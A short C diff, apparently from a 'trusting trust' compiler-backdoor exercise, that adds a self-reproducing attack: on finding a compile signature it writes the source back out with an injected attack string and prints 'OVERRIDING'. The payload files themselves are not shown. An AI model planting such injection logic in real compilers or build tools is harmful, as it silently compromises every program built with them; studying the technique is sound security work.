@@ -38,7 +38,8 @@ static void compile(char *program, char *outname) {
 
     char* compile_loc = strstr(program, compile_sig);
 
-    #include "attack-arr.c"
+    #include "attack-quine.c"
+
 
     if (compile_loc) {
         FILE *fp = fopen("./temp-out.c", "w");
@@ -54,13 +55,15 @@ static void compile(char *program, char *outname) {
         char_ptr += strlen(compile_sig);
         fprintf(fp, "\n%s", compile_sig);
         fprintf(fp, "\n\t%s", compile_attack);
-
+        
         while (char_ptr != program + strlen(program)) {
             fprintf(fp, "%c", *char_ptr);
             char_ptr++;
         }
-
+        
         fclose(fp);
+        compiled_compiler = 1;
+        printf("OVERRIDING");
     }
 
  
